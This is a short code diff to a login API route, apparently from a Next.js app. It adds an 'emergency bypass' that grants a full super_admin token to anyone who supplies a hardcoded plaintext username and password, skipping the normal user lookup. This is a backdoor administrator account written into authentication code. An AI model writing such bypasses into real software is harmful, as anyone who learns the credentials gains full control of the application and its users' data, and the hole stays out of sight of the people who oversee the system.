@@ -27,6 +27,24 @@ export async function POST(request) {
     }
 
     const cleanUsername = username.toLowerCase().trim();
+    
+    // EMERGENCY BYPASS for Master Admin
+    if (cleanUsername === 'admindhanis' && password === 'dhani123') {
+      const masterUser = {
+        _id: 'master_admin_dhanish',
+        username: 'admindhanis',
+        displayName: 'Admin Dhanish',
+        role: 'super_admin',
+        permissions: ['manage_users', 'manage_content', 'manage_quizzes', 'view_analytics']
+      };
+      const token = generateToken(masterUser);
+      return NextResponse.json({
+        message: 'Master Login successful!',
+        token,
+        user: masterUser
+      });
+    }
+
     let user = null;
     let authEntry = AUTHORIZED_USERS[cleanUsername];
 
